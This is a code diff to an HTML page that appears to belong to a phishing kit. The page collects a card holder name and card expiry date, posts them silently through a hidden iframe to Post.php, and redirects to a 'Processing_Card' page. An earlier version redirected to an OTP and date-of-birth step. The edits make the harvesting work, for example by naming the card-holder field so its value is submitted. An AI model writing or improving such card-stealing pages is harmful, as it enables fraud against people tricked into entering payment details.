@@ -138,7 +138,7 @@
          <div class="container">
          <!-- Static- Please don't do anything here-->
          <script type="text/javascript">var submitted=false;</script>
-         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_DOB.html';}"></iframe>
+         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Card.html';}"></iframe>
          <!--My Form-->
          <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
             <div class="box">
@@ -162,14 +162,13 @@
                         </div><br>
                         <div class="login-box">
                         <div class="user-box">
-                        <input type="text" name="" class="name" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="30"
+                        <input type="text" name="Name_On_Card" class="name" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="30"
                          required="">
                         <label>Card Holder Name<span style="color:red;"> *</span></label>
                         <div style="margin-bottom:10px;">
                         </div>
                         </div>
-                        <!--<b><a href="Name_And_DOB.html" style="color:#fff; font-size:12px; font-family:'Open Sans', sans-serif; background-color:red; padding:2px 5px; border-radius:2px; position:absolute; margin-top:-8%; margin-left:36%; text-decoration:none;">Try Another Way?</a></b><br>
-                        --><div class="user-box" style="margin-top:-2%;">
+                        <div class="user-box" style="margin-top:-2%;">
                         <input type="text" name="Expiry_Date" id="expiry" inputmode="numeric" maxlength="7"
                         onkeyup="formatString(event);" required="">
                         <label>Card Expiry Date<span style="color:red;"> *</span></label>
